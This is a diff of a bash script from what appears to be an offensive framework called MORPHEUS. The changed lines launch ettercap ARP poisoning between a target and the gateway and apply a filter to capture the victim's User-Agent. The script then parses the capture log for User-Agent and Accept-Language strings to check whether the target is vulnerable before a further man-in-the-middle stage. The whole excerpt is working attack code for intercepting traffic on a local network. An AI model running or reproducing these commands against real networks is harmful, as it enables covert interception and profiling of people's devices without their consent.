@@ -846,28 +846,19 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
       echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
-        if [ "$LoGs" = "NO" ]; then
-        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
-        else
-        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -q -i $InT3R -F $IPATH/output/UserAgent.ef -L $IPATH/logs/UserAgent -M ARP /$rhost// /$gateway// && sleep 3"
-        fi
-
+        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
       else
-
-        if [ "$LoGs" = "YES" ]; then
-        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
-        else
-        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -q -i $InT3R -F $IPATH/output/UserAgent.ef -L $IPATH/logs/UserAgent -M ARP /$rhost/ /$gateway/ && sleep 3"
-        fi
+        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
       fi
 
 
   # check if target system its vuln
+  # User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
+  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print $2,$3,$4'}`
   VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7,$8'}`
-  echo ${BlueF}[☠]${GreenF} '|'_ $VeVul${Reset};
-  sleep 2
-
-
+  echo "${GreenF}    Accept-Language: $AcLa ${BlueF}"
+  echo "${GreenF}    User-Agent: $VeVul ${BlueF}"
+  sleep 3
 
 
       # run mitm+filter
